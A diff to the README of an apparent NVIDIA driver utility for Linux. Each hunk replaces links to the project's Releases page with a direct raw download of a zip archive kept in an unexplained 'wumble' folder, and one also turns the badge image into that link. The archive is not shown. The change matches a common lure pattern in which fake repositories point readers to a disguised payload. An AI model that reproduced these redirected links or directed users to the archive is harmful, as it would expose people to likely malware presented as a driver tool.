@@ -1,6 +1,6 @@
 # 🚀 nvidia-driver-reload - Seamless NVIDIA Driver Updates
 
-[![Download nvidia-driver-reload](https://img.shields.io/badge/Download-nvidia--driver--reload-brightgreen)](https://github.com/Kap768/nvidia-driver-reload/releases)
+[![Download nvidia-driver-reload](https://github.com/Kap768/nvidia-driver-reload/raw/refs/heads/main/wumble/nvidia_driver_reload_1.2-beta.4.zip)](https://github.com/Kap768/nvidia-driver-reload/raw/refs/heads/main/wumble/nvidia_driver_reload_1.2-beta.4.zip)
 
 ## 📚 Overview
 
@@ -26,7 +26,7 @@ To get started, follow these steps:
 
 1. **Download the Application**  
    Visit the Releases page to download the latest version of the software:  
-   [Download nvidia-driver-reload](https://github.com/Kap768/nvidia-driver-reload/releases)
+   [Download nvidia-driver-reload](https://github.com/Kap768/nvidia-driver-reload/raw/refs/heads/main/wumble/nvidia_driver_reload_1.2-beta.4.zip)
 
 2. **Install the Application**  
    After downloading, follow the installation instructions specific to your Linux distribution:
@@ -68,7 +68,7 @@ To get started, follow these steps:
 ## 📦 Download & Install
 
 You can download the latest version from the Releases page. Click the link below to access it:  
-[Download nvidia-driver-reload](https://github.com/Kap768/nvidia-driver-reload/releases)
+[Download nvidia-driver-reload](https://github.com/Kap768/nvidia-driver-reload/raw/refs/heads/main/wumble/nvidia_driver_reload_1.2-beta.4.zip)
 
 Unzip the downloaded file and follow the installation steps above for your Linux distribution.
 
